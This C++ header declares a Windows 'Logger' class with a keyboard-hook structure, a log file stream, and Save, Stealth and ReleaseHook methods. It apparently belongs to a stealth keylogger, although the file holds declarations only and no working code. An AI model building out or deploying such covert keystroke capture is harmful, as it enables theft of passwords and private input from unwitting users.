
#ifndef LION_LOGGER_H
#define LION_LOGGER_H




#include <windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>
#include <sstream>
#include <string>
#include <ctime>
class Logger
{

private:
	std::string fileName;
		int res;
	
	
	
	bool canLog;
	bool logging;
//	OUTPUT_FILE.open(fn,std::ios_base::app);
	
long logTime;
	std::ofstream OUTPUT_FILE;
	


public:
KBDLLHOOKSTRUCT kbdStruct;

public:
	Logger(const char *);
	
	

	int Save();
	
	void Stealth();
	void ReleaseHook();
	bool getCanLog(){
		return canLog;
	}


	
	~Logger();
	
};

	#endif
